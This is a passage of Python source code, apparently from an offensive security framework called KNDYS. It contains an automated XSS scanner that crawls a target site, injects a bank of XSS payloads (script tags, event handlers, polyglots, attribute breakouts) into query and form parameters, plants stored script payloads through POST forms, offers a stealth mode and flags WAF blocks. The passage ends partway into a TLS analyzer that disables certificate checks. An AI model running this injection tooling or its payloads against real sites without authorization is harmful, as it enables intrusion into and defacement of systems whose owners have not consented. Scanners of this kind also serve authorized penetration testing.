        return max(min_value, min(max_value, num))

    def _parse_size_option(self, value, default=0):
        if value is None:
            return default
        if isinstance(value, (int, float)):
            return max(0, int(value))
        text = str(value).strip()
        if not text:
            return default
        match = re.match(r"^(?P<num>\d+(?:\.\d+)?)(?P<unit>[kKmMgGtT]?[bB]?)$", text)
        if not match:
            try:
                return max(0, int(float(text)))
            except ValueError:
                return default
        number = float(match.group('num'))
        unit = match.group('unit').lower()
        multiplier = 1
        if unit.startswith('k'):
            multiplier = 1024
        elif unit.startswith('m'):
            multiplier = 1024 ** 2
        elif unit.startswith('g'):
            multiplier = 1024 ** 3
        elif unit.startswith('t'):
            multiplier = 1024 ** 4
        return max(0, int(number * multiplier))

    def _build_header_map(self, header_blob):
        headers = {}
        if not header_blob:
            return headers
        for line in re.split(r'[\r\n;]', header_blob):
            if ':' not in line:
                continue
            name, value = line.split(':', 1)
            name = name.strip()
            value = value.strip()
            if name:
                headers[name] = value
        return headers

    def _build_cookie_map(self, cookie_blob):
        cookies = {}
        if not cookie_blob:
            return cookies
        for chunk in cookie_blob.split(';'):
            if '=' not in chunk:
                continue
            name, value = chunk.split('=', 1)
            name = name.strip()
            value = value.strip()
            if name:
                cookies[name] = value
        return cookies

    def _build_proxy_map(self, proxy_blob):
        if not proxy_blob:
            return None
        proxies = {}
        entries = re.split(r'[;,]', proxy_blob.strip())
        for entry in entries:
            chunk = entry.strip()
            if not chunk:
                continue
            if '://' in chunk and '=' not in chunk:
                proxies.setdefault('http', chunk)
                proxies.setdefault('https', chunk)
                continue
            if '=' in chunk:
                key, value = chunk.split('=', 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    proxies[key] = value
        return proxies or None

    def _build_env_map(self, env_blob):
        env = {}
        if not env_blob:
            return env
        if isinstance(env_blob, dict):
            for key, value in env_blob.items():
                key_str = str(key).strip()
                if not key_str:
                    continue
                env[key_str] = str(value)
            return env
        for chunk in re.split(r'[;,]', str(env_blob)):
            if '=' not in chunk:
                continue
            key, value = chunk.split('=', 1)
            key = key.strip()
            if not key:
                continue
            env[key] = value.strip()
        return env

    def _discover_xss_surface(self, opts):
        queue_items = deque([(opts['url'], 0)])
        visited = set()
        points = []
        post_points = []
        dom_candidates = []
        point_ids = set()
        stats = {'pages': 0, 'forms': 0, 'errors': []}
        while queue_items and stats['pages'] < opts['max_pages']:
            current, depth = queue_items.popleft()
            normalized = self._normalize_crawl_url(current)
            if normalized in visited:
                continue
            visited.add(normalized)
            if opts['rate_limiter']:
                opts['rate_limiter'].wait_if_needed()
            try:
                response = requests.get(current, headers=opts['headers'], cookies=opts['cookies'], timeout=opts['timeout'], verify=False, allow_redirects=True)
            except Exception as exc:
                stats['errors'].append(f"{current}: {exc}")
                continue
            stats['pages'] += 1
            final_url = response.url or current
            dom_candidates.append(final_url)
            new_points = self._build_points_from_url(final_url, opts, point_ids)
            points.extend(new_points)
            post_points.extend([p for p in new_points if p['method'] == 'POST'])
            if opts['include_forms'] and 'text' in response.headers.get('Content-Type', '').lower():
                form_points, form_count = self._build_points_from_forms(response.text, final_url, opts, point_ids)
                stats['forms'] += form_count
                points.extend(form_points)
                post_points.extend([p for p in form_points if p['method'] == 'POST'])
            if len(points) >= opts['max_parameters']:
                break
            if opts['scope'] != 'single' and depth < opts['crawl_depth']:
                links = self._extract_links_from_html(response.text if 'text' in response.headers.get('Content-Type', '').lower() else '', final_url)
                for link in links:
                    if self._should_follow_link(opts['base_host'], link, opts['scope']):
                        queue_items.append((link, depth + 1))
        dom_candidates = dom_candidates[:max(1, opts['dom_limit'] * 2)]
        stats['parameters'] = len(points)
        return {
            'injection_points': points,
            'post_points': post_points,
            'dom_candidates': dom_candidates,
            'stats': stats
        }

    def _normalize_crawl_url(self, url):
        parsed = urlparse(url)
        path = parsed.path or '/'
        normalized = f"{parsed.scheme}://{parsed.netloc}{path}"
        if parsed.query:
            normalized = f"{normalized}?{parsed.query}"
        return normalized.rstrip('/')

    def _should_follow_link(self, base_host, url, scope):
        parsed = urlparse(url)
        if parsed.scheme not in {'http', 'https'}:
            return False
        if scope == 'single':
            return False
        if parsed.netloc.lower() != base_host:
            return False
        return True

    def _extract_links_from_html(self, html_text, base_url):
        links = set()
        if not html_text:
            return []
        if BS4_AVAILABLE:
            soup = BeautifulSoup(html_text, 'html.parser')
            for tag in soup.find_all('a', href=True):
                href = tag.get('href')
                if not href:
                    continue
                if href.startswith('javascript:') or href.startswith('mailto:'):
                    continue
                resolved = urljoin(base_url, href)
                links.add(resolved.split('#')[0])
        else:
            for match in re.findall(r"href=['\"]([^'\"]+)['\"]", html_text, re.IGNORECASE):
                if match.startswith('javascript:') or match.startswith('mailto:'):
                    continue
                resolved = urljoin(base_url, match)
                links.add(resolved.split('#')[0])
        return list(links)

    def _build_points_from_url(self, url, opts, point_ids):
        if 'GET' not in opts['method_filter']:
            return []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
        query_pairs = parse_qsl(parsed.query or '', keep_blank_values=True)
        remaining = max(0, opts['max_parameters'] - len(point_ids))
        if remaining == 0 or not query_pairs:
            return []
        points = []
        params = dict(query_pairs)
        for name, value in query_pairs:
            if opts['parameter_filter'] and name not in opts['parameter_filter']:
                continue
            unique_id = f"{base_url}|GET|{name}"
            if unique_id in point_ids:
                continue
            point_ids.add(unique_id)
            point = {
                'id': unique_id,
                'url': base_url,
                'original_url': url,
                'method': 'GET',
                'param': name,
                'location': 'query',
                'params': params.copy(),
                'data': {},
                'query_params': {},
                'content_type': 'application/x-www-form-urlencoded',
                'source': 'query',
                'supports_stored': False,
                'verification_url': base_url
            }
            points.append(point)
            if len(points) >= remaining:
                break
        return points

    def _build_points_from_forms(self, html_text, base_url, opts, point_ids):
        if not BS4_AVAILABLE:
            return ([], 0)
        remaining = max(0, opts['max_parameters'] - len(point_ids))
        if remaining == 0:
            return ([], 0)
        soup = BeautifulSoup(html_text, 'html.parser')
        form_points = []
        form_count = 0
        added = 0
        for form in soup.find_all('form'):
            if added >= remaining:
                break
            method = form.get('method', 'get').upper()
            if method not in opts['method_filter']:
                continue
            action = form.get('action') or base_url
            resolved = urljoin(base_url, action)
            parsed = urlparse(resolved)
            base_action = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
            query_params = dict(parse_qsl(parsed.query or '', keep_blank_values=True))
            inputs = {}
            for field in form.find_all(['input', 'textarea', 'select']):
                name = field.get('name')
                if not name:
                    continue
                if opts['parameter_filter'] and name not in opts['parameter_filter']:
                    continue
                default_value = field.get('value', '')
                inputs[name] = default_value
            if not inputs:
                continue
            form_count += 1
            content_type = form.get('enctype', 'application/x-www-form-urlencoded').lower()
            for name in inputs.keys():
                if added >= remaining:
                    break
                unique_id = f"{base_action}|{method}|{name}"
                if unique_id in point_ids:
                    continue
                point_ids.add(unique_id)
                point = {
                    'id': unique_id,
                    'url': base_action,
                    'original_url': resolved,
                    'method': method,
                    'param': name,
                    'location': 'body' if method == 'POST' else 'query',
                    'params': inputs.copy() if method == 'GET' else {},
                    'data': inputs.copy() if method == 'POST' else {},
                    'query_params': query_params.copy(),
                    'content_type': content_type,
                    'source': 'form',
                    'supports_stored': method == 'POST',
                    'verification_url': base_action
                }
                form_points.append(point)
                added += 1
        return form_points, form_count

    def _build_manual_points(self, opts):
        if not opts['manual_parameters']:
            return []
        method = 'GET' if 'GET' in opts['method_filter'] else 'POST'
        base_url = opts['url']
        manual_points = []
        for name in opts['manual_parameters']:
            point = {
                'id': f"{base_url}|{method}|{name}|manual",
                'url': base_url,
                'original_url': base_url,
                'method': method,
                'param': name,
                'location': 'query' if method == 'GET' else 'body',
                'params': {},
                'data': {},
                'query_params': {},
                'content_type': 'application/x-www-form-urlencoded',
                'source': 'manual',
                'supports_stored': method == 'POST',
                'verification_url': base_url
            }
            manual_points.append(point)
        return manual_points

    def _build_xss_payload_bank(self, opts):
        payloads = [
            {'id': 'classic_script', 'template': "<script>confirm('{X}')</script>", 'category': 'classic'},
            {'id': 'img_onerror', 'template': "<img src=x onerror=alert('{X}')>", 'category': 'event'},
            {'id': 'svg_onload', 'template': "<svg/onload=alert('{X}')>", 'category': 'svg'},
            {'id': 'attribute_breakout', 'template': "\"><script>alert('{X}')</script>", 'category': 'breakout'},
            {'id': 'attribute_single_quote', 'template': "'><img src=x onerror=alert('{X}')>", 'category': 'breakout'},
            {'id': 'body_onload', 'template': "<body onload=alert('{X}')>", 'category': 'event'},
            {'id': 'input_onfocus', 'template': "\" autofocus onfocus=alert('{X}') x=\"", 'category': 'attribute'},
            {'id': 'javascript_uri', 'template': "javascript:alert('{X}')", 'category': 'uri'},
            {'id': 'svg_animate', 'template': "<svg><animate onbegin=alert('{X}') attributeName=href></svg>", 'category': 'svg'},
            {'id': 'iframe_srcdoc', 'template': "\"><iframe srcdoc=\"<script>alert('{X}')</script>\">", 'category': 'dom'},
            {'id': 'math_href', 'template': "<math href=javascript:alert('{X}')></math>", 'category': 'dom'},
            {'id': 'link_import', 'template': "\"><link rel=import href=\"data:text/html,<script>alert('{X}')</script>\">", 'category': 'dom'},
            {'id': 'polyglot', 'template': "jaVasCript:/*-/*`/*\\`/*'/*\"/**/( )/**/alert('{X}')//", 'category': 'polyglot'},
            {'id': 'svg_script_href', 'template': "<svg><script href=data:text/javascript,alert('{X}')></script>", 'category': 'svg'},
            {'id': 'object_data', 'template': "\"><object data=\"javascript:alert('{X}')\"></object>", 'category': 'dom'},
            {'id': 'textarea_break', 'template': "\"></textarea><script>alert('{X}')</script>", 'category': 'breakout'},
            {'id': 'details_toggle', 'template': "<details open ontoggle=alert('{X}')>", 'category': 'event'},
            {'id': 'marquee', 'template': "<marquee onstart=alert('{X}')>", 'category': 'event'},
            {'id': 'drag_event', 'template': "<p draggable=true ondragend=alert('{X}')>", 'category': 'event'},
            {'id': 'embed_js', 'template': "<embed src=javascript:alert('{X}')>", 'category': 'dom'},
            {'id': 'noscript_breakout', 'template': "</noscript><script>alert('{X}')</script>", 'category': 'breakout'},
            {'id': 'template_literal', 'template': "<script>setTimeout(()=>alert('{X}'))</script>", 'category': 'classic'},
            {'id': 'svg_foreignObject', 'template': "<svg><foreignObject><iframe srcdoc=\"<script>alert('{X}')</script>\"></iframe></foreignObject></svg>", 'category': 'svg'},
            {'id': 'data_uri', 'template': "data:text/html,<script>alert('{X}')</script>", 'category': 'uri'}
        ]
        rng = random.Random(opts['scan_id'])
        rng.shuffle(payloads)
        if opts['stealth']:
            payloads = [p for p in payloads if p['category'] in {'classic', 'event', 'uri', 'attribute', 'breakout'}]
        return payloads[:max(1, opts['payload_limit'])]

    def _render_payload_template(self, template, marker):
        if '{X}' in template:
            return template.replace('{X}', marker)
        if 'XSS' in template:
            return template.replace('XSS', marker)
        return f"{template}{marker}"

    def _build_xss_test_matrix(self, points, payloads, opts):
        matrix = []
        for point in points:
            used = 0
            for payload_def in payloads:
                if opts['payload_limit'] and used >= opts['payload_limit']:
                    break
                marker = f"KNDYS{opts['scan_id']}{secrets.token_hex(3)}"
                payload = self._render_payload_template(payload_def['template'], marker)
                matrix.append({
                    'point': point,
                    'payload': payload,
                    'marker': marker,
                    'payload_id': payload_def['id'],
                    'category': payload_def['category']
                })
                used += 1
        random.shuffle(matrix)
        return matrix

    def _execute_xss_tests(self, cases, opts):
        results = {
            'cases_executed': len(cases),
            'requests': 0,
            'vulnerabilities': [],
            'observations': [],
            'waf_events': [],
            'errors': []
        }
        if not cases:
            return results
        lock = threading.Lock()
        with concurrent.futures.ThreadPoolExecutor(max_workers=opts['threads']) as executor:
            future_map = {executor.submit(self._execute_single_xss_case, case, opts): case for case in cases}
            for future in concurrent.futures.as_completed(future_map):
                case = future_map[future]
                try:
                    outcome = future.result()
                except Exception as exc:
                    results['errors'].append({'parameter': case['point']['param'], 'url': case['point']['url'], 'error': str(exc)})
                    continue
                if outcome.get('error'):
                    results['errors'].append(outcome['error'])
                    continue
                results['requests'] += 1
                if outcome.get('waf'):
                    results['waf_events'].append({'url': case['point']['url'], 'status': outcome['status_code']})
                detection = outcome['detection']
                if detection.get('vulnerable'):
                    entry = {
                        'type': detection.get('variant', 'Reflected'),
                        'method': case['point']['method'],
                        'parameter': case['point']['param'],
                        'endpoint': case['point']['url'],
                        'payload': case['payload'],
                        'marker': case['marker'],
                        'context': detection.get('contexts', []),
                        'evidence': detection.get('snippet', ''),
                        'confidence': detection.get('confidence', 'Medium'),
                        'status_code': outcome['status_code'],
                        'response_time_ms': outcome['response_time_ms'],
                        'category': case['category']
                    }
                    results['vulnerabilities'].append(entry)
                    with lock:
                        print(f"{Fore.GREEN}[+] {entry['type']} via {entry['method']} parameter '{entry['parameter']}'{Style.RESET_ALL}")
                elif detection.get('observation'):
                    results['observations'].append({
                        'parameter': case['point']['param'],
                        'endpoint': case['point']['url'],
                        'detail': detection['observation']
                    })
        return results

    def _execute_single_xss_case(self, case, opts):
        point = case['point']
        headers = opts['headers'].copy()
        if point.get('content_type') and point['method'] == 'POST':
            headers['Content-Type'] = point['content_type']
        params = point.get('params', {}).copy()
        data = point.get('data', {}).copy()
        query_params = point.get('query_params', {}).copy()
        payload = case['payload']
        param_name = point['param']
        request_kwargs = {}
        if opts['rate_limiter']:
            opts['rate_limiter'].wait_if_needed()
        if point['method'] == 'GET':
            params[param_name] = payload
            if query_params:
                params.update(query_params)
            request_kwargs['params'] = params
        else:
            if point.get('content_type') == 'application/json':
                json_body = data.copy() if data else {}
                json_body[param_name] = payload
                request_kwargs['json'] = json_body
            else:
                data[param_name] = payload
                request_kwargs['data'] = data
            if query_params:
                request_kwargs['params'] = query_params
        start = time.time()
        try:
            response = requests.request(
                point['method'],
                point['url'],
                headers=headers,
                cookies=opts['cookies'],
                timeout=opts['timeout'],
                verify=False,
                allow_redirects=True,
                **request_kwargs
            )
        except Exception as exc:
            return {'error': {'parameter': param_name, 'url': point['url'], 'error': str(exc)}}
        elapsed_ms = round((time.time() - start) * 1000, 2)
        content_type = response.headers.get('Content-Type', '').lower()
        analyze_body = (not content_type) or any(token in content_type for token in ('html', 'json', 'xml', 'text'))
        body = response.text if analyze_body else ''
        detection = self._analyze_xss_response(body, case['payload'], case['marker']) if body else {'vulnerable': False}
        waf = response.status_code in {403, 406, 429} or 'access denied' in response.text[:400].lower()
        return {
            'status_code': response.status_code,
            'response_time_ms': elapsed_ms,
            'detection': detection,
            'waf': waf
        }

    def _analyze_xss_response(self, body, payload, marker):
        lowered = body.lower()
        marker_lower = marker.lower()
        contexts = []
        snippet = ''
        vulnerable = False
        variant = None
        confidence = 'Medium'
        if marker_lower in lowered:
            vulnerable = True
            variant = 'Reflected'
            snippet = self._extract_evidence_snippet(body, marker)
            contexts.append('raw')
            if re.search(r'<script[^>]*>[^<]*' + re.escape(marker), body, re.IGNORECASE):
                contexts.append('script')
                confidence = 'High'
            if re.search(r'on[a-z]+\s*=\s*[^>]*' + re.escape(marker), body, re.IGNORECASE):
                contexts.append('event')
                confidence = 'High'
            if re.search(r'javascript:[^"\']*' + re.escape(marker), body, re.IGNORECASE):
                contexts.append('uri')
        else:
            html_marker = html.escape(marker)
            url_marker = quote(marker)
            if html_marker.lower() in lowered:
                snippet = self._extract_evidence_snippet(body, html_marker)
                return {
                    'vulnerable': False,
                    'contexts': ['encoded'],
                    'snippet': snippet,
                    'observation': 'Marker reflected with HTML encoding'
                }
            if url_marker.lower() in lowered:
                snippet = self._extract_evidence_snippet(body, url_marker)
                return {
                    'vulnerable': False,
                    'contexts': ['urlencoded'],
                    'snippet': snippet,
                    'observation': 'Marker reflected URL-encoded'
                }
        return {
            'vulnerable': vulnerable,
            'variant': variant,
            'contexts': contexts,
            'snippet': snippet,
            'confidence': confidence
        }

    def _extract_evidence_snippet(self, body, marker, window=80):
        haystack = body.lower()
        needle = marker.lower()
        idx = haystack.find(needle)
        if idx == -1:
            return ''
        start = max(0, idx - window)
        end = min(len(body), idx + len(marker) + window)
        snippet = body[start:end]
        return snippet.replace('\n', ' ').replace('\r', ' ')

    def _scan_dom_targets(self, urls, opts):
        findings = []
        limit = max(1, opts['dom_limit'])
        checked = 0
        patterns = [
            (r'document\.write\s*\(', 'document.write sink', 'Medium'),
            (r'innerHTML\s*=', 'innerHTML assignment', 'Medium'),
            (r'eval\s*\(', 'eval usage', 'High'),
            (r'setTimeout\s*\([^)]*location', 'setTimeout with location', 'High'),
            (r'location\.(hash|search)', 'Location reflection', 'Medium'),
            (r'new Function', 'new Function sink', 'High')
        ]
        visited = set()
        for url in urls:
            if checked >= limit:
                break
            if url in visited:
                continue
            visited.add(url)
            if opts['rate_limiter']:
                opts['rate_limiter'].wait_if_needed()
            try:
                response = requests.get(url, headers=opts['headers'], cookies=opts['cookies'], timeout=opts['timeout'], verify=False, allow_redirects=True)
            except Exception:
                continue
            body = response.text
            matches = 0
            for pattern, desc, severity in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    snippet = self._extract_evidence_snippet(body, match.group(0))
                    findings.append({'url': url, 'pattern': desc, 'severity': severity, 'evidence': snippet})
                    matches += 1
                if matches >= 3:
                    break
            checked += 1
        return findings

    def _submit_stored_payload(self, point, payload, marker, opts):
        case = {'point': point, 'payload': payload, 'marker': marker}
        outcome = self._execute_single_xss_case(case, opts)
        return outcome.get('error') is None

    def _run_stored_xss_checks(self, points, opts):
        findings = []
        candidates = [p for p in points if p.get('supports_stored')]
        if not candidates:
            return findings
        limit = min(opts['stored_limit'], len(candidates))
        for point in candidates[:limit]:
            marker = f"STORED{secrets.token_hex(4)}"
            payload = f"<script>document.body.dataset.kndys='{marker}'</script>"
            submitted = self._submit_stored_payload(point, payload, marker, opts)
            if not submitted:
                continue
            time.sleep(1.0)
            verification_url = point.get('verification_url') or point['url']
            if opts['rate_limiter']:
                opts['rate_limiter'].wait_if_needed()
            try:
                response = requests.get(verification_url, headers=opts['headers'], cookies=opts['cookies'], timeout=opts['timeout'], verify=False, allow_redirects=True)
            except Exception:
                continue
            if marker in response.text:
                snippet = self._extract_evidence_snippet(response.text, marker)
                finding = {
                    'method': point['method'],
                    'parameter': point['param'],
                    'verification_url': verification_url,
                    'payload': payload,
                    'evidence': snippet
                }
                findings.append(finding)
                print(f"{Fore.GREEN}[+] Stored XSS indicator persisted for parameter '{point['param']}'{Style.RESET_ALL}")
        return findings

    def _summarize_xss_results(self, opts, discovery, results, dom_findings, stored_findings, start_time):
        elapsed = time.time() - start_time
        timestamp = int(start_time)
        summary = {
            'target': opts['url'],
            'timestamp': timestamp,
            'duration': elapsed,
            'mode': opts['mode'],
            'scope': opts['scope'],
            'method': opts['method_label'],
            'options': {
                'threads': opts['threads'],
                'timeout': opts['timeout'],
                'payload_limit': opts['payload_limit'],
                'include_forms': opts['include_forms'],
                'include_dom': opts['include_dom'],
                'stored_check': opts['stored_check'],
                'stealth': opts['stealth'],
                'manual_parameters': opts['manual_parameters'],
                'custom_headers': list(opts['custom_headers'].keys()),
                'cookies': list(opts['cookies'].keys())
            },
            'stats': {
                'pages_enumerated': discovery['stats']['pages'],
                'forms_processed': discovery['stats']['forms'],
                'parameters_enumerated': discovery['stats'].get('parameters', 0),
                'cases_executed': results['cases_executed'],
                'requests': results['requests'],
                'waf_events': len(results['waf_events']),
                'errors': len(results['errors'])
            },
            'vulnerabilities': results['vulnerabilities'],
            'dom_findings': dom_findings,
            'stored_findings': stored_findings,
            'waf_events': results['waf_events'],
            'errors': results['errors'],
            'observations': results['observations'],
            'discovery': discovery['stats']
        }
        return summary

    def _export_xss_results(self, summary):
        safe_target = re.sub(r'[^a-zA-Z0-9._-]', '_', summary['target'])
        timestamp = summary['timestamp']
        json_file = f"xss_scan_{safe_target}_{timestamp}.json"
        with open(json_file, 'w', encoding='utf-8') as fh:
            json.dump(summary, fh, indent=2)
        txt_file = f"xss_scan_{safe_target}_{timestamp}_report.txt"
        with open(txt_file, 'w', encoding='utf-8') as fh:
            fh.write("=" * 78 + "\n")
            fh.write("XSS SCAN REPORT - KNDYS FRAMEWORK\n")
            fh.write("=" * 78 + "\n\n")
            fh.write(f"Target: {summary['target']}\n")
            fh.write(f"Profile: {summary['mode']} | Scope: {summary['scope']} | Method: {summary['method']}\n")
            fh.write(f"Duration: {summary['duration']:.2f}s\n")
            fh.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(timestamp))}\n\n")
            fh.write("Statistics:\n")
            fh.write("-" * 78 + "\n")
            for key, value in summary['stats'].items():
                fh.write(f" {key.replace('_', ' ').title()}: {value}\n")
            fh.write("\nVulnerabilities:\n")
            fh.write("-" * 78 + "\n")
            if summary['vulnerabilities']:
                for vuln in summary['vulnerabilities']:
                    fh.write(f" - {vuln['type']} via {vuln['method']} parameter '{vuln['parameter']}'\n")
                    fh.write(f" Payload: {vuln['payload']}\n")
                    if vuln.get('evidence'):
                        fh.write(f" Evidence: {vuln['evidence']}\n")
            else:
                fh.write(" None detected\n")
            fh.write("\nDOM Findings:\n")
            fh.write("-" * 78 + "\n")
            if summary['dom_findings']:
                for finding in summary['dom_findings']:
                    fh.write(f" - {finding['severity']} risk at {finding['url']} ({finding['pattern']})\n")
            else:
                fh.write(" None\n")
            fh.write("\nStored Findings:\n")
            fh.write("-" * 78 + "\n")
            if summary['stored_findings']:
                for finding in summary['stored_findings']:
                    fh.write(f" - {finding['method']} parameter '{finding['parameter']}' persisted payload\n")
                    fh.write(f" Evidence: {finding['evidence']}\n")
            else:
                fh.write(" None\n")
            if summary['observations']:
                fh.write("\nReflections/Observations:\n")
                fh.write("-" * 78 + "\n")
                for obs in summary['observations']:
                    fh.write(f" - {obs['parameter']} @ {obs['endpoint']}: {obs['detail']}\n")
            if summary['waf_events']:
                fh.write("\nWAF Events:\n")
                fh.write("-" * 78 + "\n")
                for event in summary['waf_events']:
                    fh.write(f" - {event['url']} returned status {event['status']}\n")
            if summary['errors']:
                fh.write("\nErrors:\n")
                fh.write("-" * 78 + "\n")
                for err in summary['errors']:
                    fh.write(f" - {err}\n")
        print(f"{Fore.GREEN}[+] Reports saved:{Style.RESET_ALL}")
        print(f" • {json_file}")
        print(f" • {txt_file}")
    
    def run_ssl_scanner(self):
        """Adaptive SSL/TLS analyzer with protocol, cipher, and policy checks"""
        opts = self._resolve_ssl_options()
        host, port = self._parse_ssl_target(opts['target'])
        print(f"{Fore.CYAN}╔{'═'*70}╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║{' '*17}ADAPTIVE SSL/TLS ANALYZER - KNDYS v3.0{' '*17}║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚{'═'*70}╝{Style.RESET_ALL}\n")
        print(f"{Fore.CYAN}[*] Target: {host}:{port}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Mode: {opts['mode'].upper()} | Protocol Scan: {opts['protocol_scan']} | Cipher Scan: {opts['cipher_scan']}{Style.RESET_ALL}")
        start_time = time.time()
        baseline = self._perform_baseline_handshake(host, port, opts)
        if baseline.get('error'):
            print(f"{Fore.RED}[!] TLS handshake failed: {baseline['error']}{Style.RESET_ALL}")
            return
        cert_info = self._analyze_certificate(baseline, opts)
        protocol_results = self._tls_version_scan(host, port, opts) if opts['protocol_scan'] else []
        cipher_results = self._cipher_suite_scan(host, port, opts) if opts['cipher_scan'] else []
        resumption = self._test_session_resumption(host, port, opts) if opts['resumption'] else {}
        http_headers = self._fetch_http_headers(host, port, opts) if opts['http_headers'] else {}
        scoring = self._score_ssl_findings(cert_info, baseline, protocol_results, cipher_results, http_headers, opts)
        duration = time.time() - start_time
        baseline_export = {k: v for k, v in baseline.items() if k not in {'der_cert', 'peer_cert_dict'}}
        summary = {
            'target': f"{host}:{port}",
            'mode': opts['mode'],
            'baseline': baseline_export,
            'certificate': cert_info,
            'protocols': protocol_results,
            'ciphers': cipher_results,
            'resumption': resumption,
            'http_headers': http_headers,
            'score': scoring['score'],
            'grade': scoring['grade'],
            'issues': scoring['issues'],
            'timestamp': int(start_time),
            'duration': duration
        }
        self._render_ssl_console(summary)
        self._export_ssl_results(summary)

    def _resolve_ssl_options(self):
        raw = self.module_options
        mode = (raw.get('mode', 'balanced') or 'balanced').lower()
        profile = self._get_ssl_profile(mode)
        protocol_scan = self._parse_bool_option(raw.get('protocol_scan', 'true'), True)
        cipher_scan = self._parse_bool_option(raw.get('cipher_scan', 'true'), True)
        http_headers = self._parse_bool_option(raw.get('http_headers', 'true'), True)
        ocsp = self._parse_bool_option(raw.get('ocsp', 'true'), True)
        resumption = self._parse_bool_option(raw.get('resumption', 'false'), False)
        timeout = self._safe_float(raw.get('timeout'), profile['timeout'], 1.0, 30.0)
        retries = self._safe_int(raw.get('retries'), profile['retries'], 1, 5)
        sni = (raw.get('sni') or '').strip()
        alpn = [proto.strip() for proto in (raw.get('alpn', 'h2,http/1.1') or '').split(',') if proto.strip()]
        custom_ciphers = (raw.get('custom_ciphers') or '').strip()
        try:
            rate_value = float(raw.get('rate_limit', '0') or 0)
        except (TypeError, ValueError):
            rate_value = 0.0
        rate_limiter = RateLimiter(max_requests=max(1, int(rate_value)), time_window=1) if rate_value > 0 else None
        return {
            'target': raw.get('target', 'example.com:443'),
            'mode': mode,
            'protocol_scan': protocol_scan,
            'cipher_scan': cipher_scan,
            'http_headers': http_headers,
            'ocsp': ocsp,
            'resumption': resumption,
            'timeout': timeout,
            'retries': retries,
            'sni': sni,
            'alpn': alpn,
            'custom_ciphers': custom_ciphers,
            'rate_limiter': rate_limiter,
            'profile': profile
        }

    def _get_ssl_profile(self, mode):
        profiles = {
            'fast': {
                'timeout': 5.0,
                'retries': 1,
                'cipher_tests': ['RC4-SHA', 'DES-CBC3-SHA'],
                'versions': ['TLSv1_2', 'TLSv1_3']
            },
            'balanced': {
                'timeout': 7.0,
                'retries': 2,
                'cipher_tests': ['RC4-SHA', 'DES-CBC3-SHA', 'EXP-EDH-RSA-DES-CBC-SHA'],
                'versions': ['TLSv1', 'TLSv1_1', 'TLSv1_2', 'TLSv1_3']
            },
            'deep': {
                'timeout': 10.0,
                'retries': 3,
                'cipher_tests': ['RC4-SHA', 'DES-CBC3-SHA', 'EXP-EDH-RSA-DES-CBC-SHA', 'NULL-MD5', 'ECDHE-RSA-DES-CBC3-SHA'],
                'versions': ['TLSv1', 'TLSv1_1', 'TLSv1_2', 'TLSv1_3']
            }
        }
        return profiles.get(mode, profiles['balanced'])

    def _parse_ssl_target(self, target):
        if ':' in target:
            host, port = target.rsplit(':', 1)
            try:
                return host.strip(), int(port)
            except ValueError:
                return host.strip(), 443
        return target.strip(), 443

    def _create_ssl_context(self, opts, min_version=None, max_version=None, ciphers=None):
        protocol = getattr(ssl, 'PROTOCOL_TLS_CLIENT', ssl.PROTOCOL_TLS)
        context = ssl.SSLContext(protocol)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        if hasattr(context, 'minimum_version') and min_version:
            context.minimum_version = min_version
        if hasattr(context, 'maximum_version') and max_version:
            context.maximum_version = max_version
        if ciphers:
            try:
                context.set_ciphers(ciphers)
            except ssl.SSLError:
                pass
        if opts['alpn']:
            try:
                context.set_alpn_protocols(opts['alpn'])
            except NotImplementedError:
                pass
        return context

    def _perform_baseline_handshake(self, host, port, opts):
        context = self._create_ssl_context(opts)
        server_name = opts['sni'] or host
        last_error = None
        for _ in range(opts['retries']):
            try:
                if opts['rate_limiter']:
                    opts['rate_limiter'].wait_if_needed()
                with socket.create_connection((host, port), timeout=opts['timeout']) as sock:
                    with context.wrap_socket(sock, server_hostname=server_name) as tls:
                        cipher = tls.cipher()
                        data = {
                            'tls_version': tls.version(),
                            'cipher': {'name': cipher[0], 'protocol': cipher[1], 'bits': cipher[2]} if cipher else None,
                            'alpn': tls.selected_alpn_protocol(),
                            'session_reused': tls.session_reused,
                            'ocsp_stapled': bool(getattr(tls, 'ocsp_response', None)),
                            'der_cert': tls.getpeercert(binary_form=True),
                            'peer_cert_dict': tls.getpeercert()
                        }
                        return data
            except Exception as exc:
                last_error = str(exc)
        return {'error': last_error or 'connection failed'}

    def _analyze_certificate(self, baseline, opts):
        analysis = {
            'subject': None,
            'issuer': None,
            'not_before': None,
            'not_after': None,
            'days_remaining': None,
            'san': [],
            'key_type': None,
            'key_size': None,
            'signature_algorithm': None,
            'is_self_signed': False,
            'warnings': []
        }
        der_cert = baseline.get('der_cert')
        if not der_cert:
            analysis['warnings'].append('No certificate data available')
            return analysis
        if CRYPTO_AVAILABLE:
            try:
                from cryptography import x509
                from cryptography.x509.oid import ExtensionOID
                cert = x509.load_der_x509_certificate(der_cert, default_backend())
                analysis['subject'] = ', '.join(f"{attr.oid._name if hasattr(attr.oid, '_name') else attr.oid.dotted_string}={attr.value}" for attr in cert.subject)
                analysis['issuer'] = ', '.join(f"{attr.oid._name if hasattr(attr.oid, '_name') else attr.oid.dotted_string}={attr.value}" for attr in cert.issuer)

                if hasattr(cert, 'not_valid_before_utc'):
                    not_before = cert.not_valid_before_utc
                else:
                    not_before = cert.not_valid_before

                if hasattr(cert, 'not_valid_after_utc'):
                    not_after = cert.not_valid_after_utc
                else:
                    not_after = cert.not_valid_after
                if not_before and not_before.tzinfo is None:
                    not_before = not_before.replace(tzinfo=timezone.utc)
                if not_after and not_after.tzinfo is None:
                    not_after = not_after.replace(tzinfo=timezone.utc)

                analysis['not_before'] = not_before.strftime('%Y-%m-%d %H:%M:%S') if not_before else None
                analysis['not_after'] = not_after.strftime('%Y-%m-%d %H:%M:%S') if not_after else None
                if not_after:
                    now_utc = datetime.now(timezone.utc)
                    analysis['days_remaining'] = (not_after - now_utc).days

                analysis['signature_algorithm'] = getattr(cert.signature_hash_algorithm, 'name', str(cert.signature_algorithm_oid))
                try:
